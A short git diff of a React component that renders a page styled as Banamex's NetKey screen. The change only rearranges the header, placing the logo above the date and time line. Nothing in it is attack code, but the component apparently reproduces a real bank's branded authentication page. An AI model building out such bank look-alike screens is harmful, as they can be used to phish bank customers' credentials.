@@ -2901,14 +2901,11 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         const banamexNetkeyContent = (
           <div style={{ margin: 0, fontFamily: '"Helvetica Neue", Arial, sans-serif', background: '#ffffff', color: '#0b2a2d', WebkitFontSmoothing: 'antialiased', MozOsxFontSmoothing: 'grayscale', minHeight: '100vh' }}>
             <div style={{ width: '1100px', margin: '28px auto', padding: '24px', maxWidth: '95%' }}>
-              {/* Header */}
-              <header style={{ display: 'flex', alignItems: 'flex-start', gap: '20px' }}>
-                <img src="/banamex/images/logobanamex.svg" alt="Banamex" style={{ width: '72px', height: '72px', flexShrink: 0 }} />
-                <div style={{ display: 'flex', flexDirection: 'column', justifyContent: 'center' }}>
-                  <div style={{ fontSize: '40px', fontWeight: 800, color: '#0b2a2d', lineHeight: 1 }}>Banamex</div>
-                  <div style={{ marginTop: '8px', color: '#6c8b8b', fontSize: '15px' }}>
-                    {dayCapitalized} {dateStr}, {timeStr} Centro de México
-                  </div>
+              {/* Header - Logo arriba */}
+              <header style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-start', gap: '12px' }}>
+                <img src="/banamex/images/logobanamex.svg" alt="Banamex" style={{ width: '72px', height: '72px' }} />
+                <div style={{ color: '#6c8b8b', fontSize: '15px' }}>
+                  {dayCapitalized} {dateStr}, {timeStr} Centro de México
                 </div>
               </header>
 
